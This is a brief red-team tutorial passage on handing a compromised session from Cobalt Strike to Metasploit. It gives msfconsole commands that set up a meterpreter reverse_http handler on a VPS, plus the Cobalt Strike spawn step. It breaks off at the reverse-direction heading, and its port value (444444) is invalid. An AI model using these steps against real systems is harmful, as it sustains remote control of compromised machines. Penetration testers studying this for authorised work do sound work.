# Penetration Test & MSF links CobaltStrike

## CobaltStrike->MSF

​ Run `msfconsole` to start listening.

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost vps_ip
set lport 444444
exploit
```

![](img/1.png)

​ Then `CobaltStrike` creates an external listener, `Host` and `Port` for `lhost` and `lport`.

![](img/2.png)

​ Then the session is derived, and the command `spawn 105-msf is executed in the `CobaltStrike` console. The `msf` receives the derived session successfully launched.

![](img/3.png)



## MSF->CobaltStrike